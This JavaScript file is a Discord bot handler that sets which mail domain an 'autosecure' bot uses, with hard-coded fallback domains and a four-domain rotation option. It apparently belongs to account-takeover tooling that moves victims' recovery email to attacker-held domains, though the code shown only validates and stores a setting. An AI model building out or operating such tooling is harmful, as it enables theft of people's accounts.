const editautosecuremsg = require("../../../autosecure/utils/embeds/editautosecuremsg.js");
const { queryParams } = require("../../../db/database.js");
const config = require("../../../config.json");

module.exports = {
    name: "modalchangedomain",
    editautosecure: true,
    callback: async (client, interaction) => {
        try {
            let [t, botnumber, ownerid] = interaction.customId.split("|");
            let rawDomain = interaction.fields.getTextInputValue("domain").trim().toLowerCase();

            // Sanitize: strip http://, https://, and trailing slashes
            rawDomain = rawDomain.replace(/^https?:\/\//i, '').replace(/\/+$/, '');

            if (!rawDomain) {
                return interaction.reply({ content: "❌ Domain cannot be empty.", ephemeral: true });
            }

            const validDomains = (config.domains && config.domains.length > 0)
                ? config.domains.map(d => d.toLowerCase().trim())
                : ["mail.hotwar.asia", "hotwar.top", "donuttsmp.store", "ryuuu.xyz"];

            let chosenDomain = null;
            if (rawDomain.includes("rotate") || rawDomain.includes("xoay") || rawDomain === "all" || rawDomain === "4") {
                chosenDomain = "Rotate (4 Domains)";
            } else if (validDomains.includes(rawDomain)) {
                chosenDomain = rawDomain;
            } else {
                return interaction.reply({
                    content: `❌ Domain không hợp lệ!\nVui lòng nhập **Rotate** (để xoay vòng 4 domain) hoặc 1 trong 4 domain trên Web Mail API:\n• ${validDomains.join('\n• ')}`,
                    ephemeral: true
                });
            }

            await queryParams(
                `UPDATE autosecure SET domain = ? WHERE user_id = ? AND botnumber = ?`,
                [chosenDomain, ownerid, botnumber]
            );

            await queryParams(
                `UPDATE secureconfig SET domain = ? WHERE user_id = ?`,
                [chosenDomain, ownerid]
            );

            let msg = await editautosecuremsg(botnumber, ownerid);
            msg.content = `✅ Successfully updated Domain to **${chosenDomain}**!`;

            await interaction.update(msg);
        } catch (error) {
            console.error("Error in modalchangedomain:", error);
            await interaction.reply({ content: "❌ Failed to update domain. Try again later.", ephemeral: true });
        }
    }
};
